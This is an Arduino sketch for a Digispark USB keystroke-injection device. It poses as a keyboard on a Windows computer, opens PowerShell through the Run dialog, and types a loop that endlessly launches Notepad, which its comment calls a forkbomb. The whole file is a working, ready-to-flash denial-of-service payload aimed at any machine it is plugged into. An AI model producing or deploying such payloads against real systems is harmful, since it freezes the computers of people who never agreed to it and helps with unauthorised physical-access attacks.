#include "DigiKeyboard.h"
void setup() {
}

void loop() {

  // Initialises Digispark keystoke injection
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Hit Win+R and launch powershell
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  
  // Run infinite loop that opens a notepad instance on every run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("While ($true) {Start-Process 'C:\\Windows\\System32\\notepad.exe'}\;");

  // This is a forkbomb

  for (;;) {
    /*Stops the digispark from running the scipt again*/
  }
}